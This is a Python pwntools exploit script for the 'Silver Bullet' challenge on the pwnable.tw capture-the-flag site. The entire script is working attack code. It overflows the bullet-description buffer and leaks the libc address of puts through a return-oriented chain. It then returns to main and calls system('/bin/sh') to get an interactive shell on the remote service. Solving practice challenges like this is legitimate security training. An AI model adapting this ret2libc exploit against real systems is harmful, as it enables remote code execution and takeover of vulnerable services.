#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
#r = remote('127.0.0.1', 1234)
r = remote('chall.pwnable.tw', 10103)
elf = ELF('/tmp/p/a')
libc = ELF('/tmp/p/libc.so.6')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6') 
def create_sil(desc):
	r.sendlineafter('Your choice :', str(1))
	r.sendlineafter('description of bullet :', desc)

def power_up(desc):
	r.sendlineafter('Your choice :', str(2))
	r.sendlineafter('another description of bullet :', desc)

def beat():
	r.sendlineafter('Your choice :', str(3))

puts_off = libc.symbols['puts']
puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']
main = elf.symbols['main']
create_sil("a"*47)
power_up("a")
payload = flat([puts_plt, main, puts_got])
power_up(p32(0xdeadbeef)+cyclic(3)+payload)
beat()

r.recvuntil(' You win !!\n')
base = u32(r.recv(4)) - puts_off 
print "base: ",hex(base)
sh = base + next(libc.search('/bin/sh'))
system = base + libc.symbols['system']

## ret2main and jmp to system('/bin/sh\x00')
create_sil("a"*47)
power_up("a")
payload = flat([system, sh, sh])
power_up(p32(0xdeadbeef)+cyclic(3)+payload)
beat()

r.interactive()